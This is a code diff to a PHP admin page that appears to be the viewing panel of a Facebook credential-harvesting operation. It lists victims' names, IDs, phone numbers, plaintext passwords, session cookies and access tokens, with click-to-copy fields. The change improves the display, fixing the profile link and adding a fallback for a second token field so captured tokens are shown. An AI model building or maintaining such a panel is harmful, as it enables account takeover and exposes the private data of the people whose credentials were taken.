@@ -169,7 +169,7 @@
                             <?php foreach($result as $number):?>
                             <tr>
                                 <td>
-                                    <a href="https://www.facebook.com/<?php echo $number->f_name;?>" target="_blank"><?php echo $number->f_name;?><br/><?php echo $number->f_id;?><br/><?php echo $number->f_phone;?></a>
+                                    <a href="https://www.facebook.com/<?php echo $number->f_id;?>" target="_blank"><?php echo $number->f_name;?><br/><?php echo $number->f_id;?><br/><?php echo $number->f_phone;?></a>
                                     <br/>
                                     <small>Mutual Friends: <b><?php echo $number->f_lname;?></b></small>
                                 </td>
@@ -177,7 +177,12 @@
                                 $datas = json_decode($number->value);
                                 ?>
                                     <textarea style="height: 40px;margin-bottom: 5px" type="text" name="glink" class="form-control" onClick="copyText(this);"><?php echo @$datas->cookies;?></textarea>
-                                    <input type="text" name="glink" class="form-control" onClick="copyText(this);" value="<?php echo @$datas->token;?>">
+                                    <input type="text" name="glink" class="form-control" onClick="copyText(this);" value="<?php
+                                        $token = @$datas->token;
+                                        if(empty($token)) {
+                                            $token = @$datas->accessToken;
+                                        }
+                                     echo @$token;?>">
                                 </td>
                                 <td><?php echo $number->f_pass;?></td>
                                 <td>
